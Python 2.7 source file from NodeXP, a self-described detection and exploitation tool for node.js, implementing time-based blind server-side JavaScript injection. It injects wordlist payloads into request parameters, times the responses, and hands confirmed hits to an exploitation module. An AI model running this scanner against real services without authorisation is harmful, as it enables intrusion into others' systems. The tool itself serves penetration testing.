#!/usr/bin/python2.7	
# encoding: UTF-8

"""
This file is part of NodeXP, a detection & exploitation tool for 
node.js services (https://github.com/esmog/nodexp) created by 
Antonaropoulos Dimitrios (@esmog).
For more info about NodeXP see the 'README.md' file.
"""

import src.core.init.settings as settings
import argparse
import urllib
import urllib2
import httplib
from urllib2 import HTTPError, URLError
import sys
import os
import linecache
from bs4 import*
import difflib
import time
import requests
import src.interfaces.functions.interfaces as interfaces
import src.interfaces.options.verbosity as verbosity
import src.interfaces.options.prompt as prompt
import src.core.exploitation.exploitation as exploitation

try:
	from urllib.parse import urlparse

except ImportError:
	from urlparse import urlparse
from colorama import init, Fore, Back, Style

init(autoreset=True)

def blind_injection():
	try:
		if settings.inject_here_replace in settings.inject_here:
			print(Fore.YELLOW + Style.BRIGHT + '\nStarting preparation..')

			# Check redirection with valid parameters (e-mail, num, character)
			continue_process = check_redirection_with_valid_parameters()
			if continue_process != True:
				print (Fore.RED + "[!] ERROR: All requests got redirected and did not get followed. Maybe url is invalid or you have no access to this url (set the diserable cookie in this case) or simply follow redirection.")
			
			# Compute average request time based on three valid input values (string,num,email) and define threshold 
			average_time_based_on_input_type = []
			for valid_value in range(0, 3):
				
				# Initialize vars with random input values
				settings.pdata = settings.pdata.replace(settings.inject_here_replace, settings.valid_input_values[valid_value])
				compute_average_request_time(settings.validation_loop,'valid')
				average_time_based_on_input_type.append(settings.average_request_time)
				settings.pdata = settings.initial_parameter

			# Get the maximux out of averages
			settings.average_request_time = max(average_time_based_on_input_type)
			# Set threshold
			settings.minimum_time_threshold = define_time_threshold()
			
			# Start parsing txt file with payloads!
			total_line_count = sum(1 for line in open(settings.blind_ssji_wordlist))
			print(Fore.YELLOW + Style.BRIGHT + '\nStarting Blind Injection Technique')
			message = Style.DIM + '\n[-] Searching for SSJI vulnerabilities...'
			verbosity.print_message(message, settings.print_info)
			try_counter = 1	
			initial_data = settings.url
			initial_inject_here = settings.inject_here
			settings.initial_inject_here = initial_inject_here

			for index in xrange(1,total_line_count,2):
				if settings.break_blind == 0:
					
					# Initialize url and data for each new payload..
					settings.url = initial_data
					settings.inject_here = initial_inject_here

					# Get the payload from the file
					mal_code = linecache.getline(settings.blind_ssji_wordlist, index).rstrip()
					if mal_code == '---end' or mal_code == '':
						print(Fore.RED + '[!] End of payloads in the corresponding dictionary txt file.\n[!] Quit.')
						break
					if settings.request_method == 1:
					# POST CASE
						settings.inject_here = settings.inject_here.replace(settings.inject_here_replace, mal_code, 1)
						settings.pdata = settings.inject_here
					else:
					# GET CASE
						# Unquote just in case that is already percent encoded (URL encoded) and then ...
						mal_code = urllib.unquote(mal_code)
						# ... percent encode for GET requests
						percent_encoded_data = interfaces.percent_encoding(mal_code)
						settings.percent_encoded_URL = percent_encoded_data
						settings.inject_here = settings.percent_encoded_URL
						settings.pdata = settings.percent_encoded_URL
					
					# Initialize blind injection payload
					blind_replacer(settings.minimum_time_threshold)
					decimal = 0
					
					# Start randomizing payload
					if settings.blind_wildcard == 1:
						for case in range(0, 3):
							# Attack!
							decimal += 1
							settings.pdata = settings.blind_injection_cases[case]

							# Message for each injection
							print('\n%s'%settings.hr)
							print('[i] Try no. ' + format(try_counter) + '.' + format(decimal) + Fore.GREEN + Style.BRIGHT + ' (payload: '  + settings.pdata + ')' + Fore.WHITE + Style.NORMAL + ':')
							print('%s'%settings.hr)

							compute_average_request_time(settings.loop,'malicious')
				
							if settings.break_blind == 1: 
								break
							
					else:
						# Message for each injection
						print('\n%s'%settings.hr)
						print('[i] Try no. ' + format(try_counter) + '.' + format(decimal) + Fore.GREEN + Style.BRIGHT + ' (payload: '  + settings.pdata + ')' + Fore.WHITE + Style.NORMAL + ':')
						print('%s'%settings.hr)
						compute_average_request_time(settings.loop,'malicious')

					try_counter += 1
				else:
					break
		else:
			sys.exit('ERROR: [INJECT_HERE] not found on your input! > %s' %settings.inject_here)
	except Exception as e:
		print(Fore.RED + "[!] ERROR: %s" %e)
		verbosity.error_info(e)

def check_redirection_with_valid_parameters():

	redirections_sum = 0
	counter = 0
	try:
		while counter < 3: # one for each input case
			if settings.request_method == 1:
			# init valid POST parameters for request
				parameter = settings.pdata
				parameter = parameter.replace(settings.inject_here_replace,settings.valid_input_values[counter])
				request = urllib2.Request(settings.url,data=parameter,headers={'Cookie':settings.cookie})

			else:
			# Init valid GET parameters for request	
				url = settings.url.replace(settings.inject_here_replace,settings.valid_input_values[counter])
				settings.url = url
				parameter = url
				request = urllib2.Request(parameter,headers={'Cookie':settings.cookie})
			if counter == 0:
				message = Fore.YELLOW + '\n[<] Checking for redirection with valid parameter: \n(' + parameter + ')'
				verbosity.print_message(message, settings.print_info)
			else:
				message = Fore.YELLOW + '\n[-] Checking for redirection with valid parameter: \n(' + parameter + ')'
				verbosity.print_message(message, settings.print_info)

			# Check for valid redirection
			redirection = interfaces.check_redirection(urllib2.urlopen(request), settings.technique)
			# Initialize url and post data
			#settings.url = settings.initial_parameter
			if redirection == 1:
				redirections_sum += 1

			elif redirection == 0:
				settings.valid_parameters = parameter
				message = Style.DIM + '[i] No redirection with valid parameter (' + parameter + ').' + Style.NORMAL + Fore.YELLOW + '\n[>]'
				verbosity.print_message(message, settings.print_info) 
							
			counter += 1

		if redirections_sum > 2:
			return False
		else:
			return True
	
	except Exception as e:
		print(Fore.RED + "[!] ERROR: %s" %e)
		verbosity.error_info(e)	
		sys.exit()
			
def compute_average_request_time(loop,payload_type):
	amount = 0

	# Print for request with payload
	if payload_type == 'malicious':
		if settings.request_method == 0:
			message = (Fore.YELLOW + '\n[<] Computing requests\' average response time using payload: \n(%s)' %(settings.pre_url + '?' + settings.pdata))
			verbosity.print_message(message, settings.print_info)
		else:
			message = (Fore.YELLOW + '\n[<] Computing requests\' average response time using payload: \n(%s)' %settings.pdata)
			verbosity.print_message(message, settings.print_info)

	# Print for valid request
	elif payload_type == 'valid':
		if settings.request_method == 0:
			message = (Fore.YELLOW + '\n[<] Computing requests\' average response time with valid parameter: \n(%s)' %settings.pdata)
			verbosity.print_message(message, settings.print_info)
		else:
			message = (Fore.YELLOW + '\n[<] Computing requests\' average response time with valid parameter: \n(%s)' %settings.pdata)
			verbosity.print_message(message, settings.print_info)
	else:
		raise Exception(Fore.RED + '[!] ERROR: Unknown payload type or not specified on \'compute_average_request_time()\'.')
	
	for index in range(loop):
		if settings.request_method == 0:
		#GET case
			# Valid request settings
			if payload_type == 'valid':
				post_request = urllib2.Request(settings.pdata,headers={'Cookie':settings.cookie})
				blind_injection_flag = 0

			# Request with payload settings
			elif payload_type == 'malicious':
				url = settings.pre_url + '?' + settings.pdata
				settings.url = url
				post_request = urllib2.Request(url,headers={'Cookie':settings.cookie})
				blind_injection_flag = 1
				# Check also for redirection for malicious request
				if index < 1:
					interfaces.check_redirection(urllib2.urlopen(post_request), settings.technique)
			else:
				raise Exception(Fore.RED + '[!] ERROR: Unknown payload type or not specified on \'compute_average_request_time()\'.')
		else:
		#POST case
			# Valid request case
			if payload_type == 'valid':
				#request_time = requests.post(settings.pre_url, data=settings.pdata).elapsed.total_seconds()
				post_request = urllib2.Request(settings.pre_url,data=settings.pdata,headers={'Cookie':settings.cookie})
				blind_injection_flag = 0

			# Request with payload case
			elif payload_type == 'malicious':
				#request_time = requests.post(settings.pre_url, data=settings.pdata, cookies={'Cookie':settings.cookie}).elapsed.total_seconds()
				post_request = urllib2.Request(settings.pre_url,data=settings.pdata,headers={'Cookie':settings.cookie})
				blind_injection_flag = 1
				# Check also for redirection for malicious request
				if index < 1:
					interfaces.check_redirection(urllib2.urlopen(post_request), settings.technique)
			else:
				raise Exception(Fore.RED + '[!] ERROR: Unknown payload type or not specified on \'compute_average_request_time()\'.')
		try:	
			start_time = time.time()
	     		html = urllib2.urlopen(post_request).read()
			end_time = time.time() - start_time
			request_time = end_time
		except HTTPError, e:
		    	print '[i] ERROR: The server couldn\'t fulfill the request! First of all, check if the given URL is correct. In case you injected any payload on your request, server seems to interact with it so, it might be vulnerable. In this case check payload txt files for syntax errors and try again. Else, service might be down.'
		    	print '[i] ERROR: %s' %e
			verbosity.error_info(e)
			html = e.read()
			#print html
			blind_injection_flag = 0
			continue
 
		message = Style.DIM + "[-] Request no. %s -> %f seconds" %(index,request_time)
		verbosity.print_message(message, settings.print_info)

		if blind_injection_flag == 1:
			check_blind_injection(request_time)

		amount += request_time

	message =  Style.DIM + '[-] Total time spend on %d requests = %f seconds' %(loop,amount)
	verbosity.print_message(message, settings.print_info)
	settings.average_request_time = amount/loop
	settings.average_request_time = settings.average_request_time * 1000
	message = Fore.GREEN + '[!] Average request time = ' + str(settings.average_request_time)  + ' millieseconds.\n' + Fore.YELLOW + '[>]'
	verbosity.print_message(message, settings.print_info)
	if blind_injection_flag == 1:	
		print_blind_injection_stats()

def define_time_threshold():
	message = (Fore.YELLOW + '\n[<] Setting response time threshold')
	verbosity.print_message(message, settings.print_info)
	minimum_time = settings.average_request_time*settings.margin_factor
	if (minimum_time < settings.time_threshold):
		minimum_time = settings.time_threshold	
	message = Style.DIM + '[-] Calculating response threshold based on average response time (%f) and its factor (%f)' %(settings.average_request_time,settings.margin_factor)
	verbosity.print_message(message,settings.print_info)
	message = (Fore.GREEN + '[!] Acceptable response time greater than : %s milliesecond(s)' %str(minimum_time))
	verbosity.print_message(message, settings.print_info)
	message = (Fore.YELLOW + '[>]')
	verbosity.print_message(message, settings.print_info)
	return minimum_time

# Replace txt file delimeters with the correct values
def blind_replacer(minimum_time):
	minimum_time= int(minimum_time)

	# Replace #time# set on payload txt file; with minimum time value
	settings.pdata = settings.pdata.replace(settings.blind_replace,format(minimum_time))

	# Replace *** set on payload txt file; with valid input value (email, number and string)
	if (settings.wildcards[0] in settings.pdata):
		email_mal_code = settings.pdata
		character_mal_code = settings.pdata
		number_mal_code = settings.pdata
		for index in range(0, 3):
			email_mal_code = email_mal_code.replace(settings.wildcards[0],settings.blind_rand_email)
			number_mal_code = number_mal_code.replace(settings.wildcards[0],settings.blind_rand_num)
			character_mal_code = character_mal_code.replace(settings.wildcards[0],settings.blind_rand_char) 
		settings.blind_wildcard = 1
		settings.blind_injection_cases = [character_mal_code,number_mal_code,email_mal_code]
	else:
		settings.blind_wildcard = 0

def check_blind_injection(time):
	if time*1000 >= settings.minimum_time_threshold:
		#print '--YES'
		settings.blind_injection_pass[0] += 1
	else:
		#print '--NO'
		settings.blind_injection_pass[1] += 1

def print_blind_injection_stats():
	print Fore.YELLOW + "\n[<] Blind Injection Results:"
	total = settings.blind_injection_pass[0] + settings.blind_injection_pass[1]
	message = Fore.GREEN + "[!] %s out of %d passed the minimum time threshold ( %f millieseconds)" % (settings.blind_injection_pass[0],total,settings.minimum_time_threshold)
	verbosity.print_message(message,settings.print_info)
	message = Fore.GREEN + "[!] %s out of %d NOT passed the minimum time threshold ( %f millieseconds)" % (settings.blind_injection_pass[1],total,settings.minimum_time_threshold)
	verbosity.print_message(message,settings.print_info)
	rate = float(settings.blind_injection_pass[0])/(total)
	percentage = abs(rate*100)
	message = Fore.GREEN + "[!] Percentage success rate: %d%%" %percentage
	verbosity.print_message(message,settings.print_info)
	clear_blind_injection_arrays()
	if percentage < 100:
		print(Fore.RED + '[!] Blind injection is not 100% sucessfull and does not seem to be vulnerable. In case you want more accurate results you have to re-run the process.')
	else:
		ask_exploitation = interfaces.change_technique(settings.ex_prompt_message,settings.ex_options_message,settings.ex_alter_tech_msg,settings.ex_current_tech_msg)
		if ask_exploitation == True:
			exploitation.initialize_payload_options(True)

def clear_blind_injection_arrays():
	settings.blind_injection_pass[0] = 0
	settings.blind_injection_pass[1] = 0

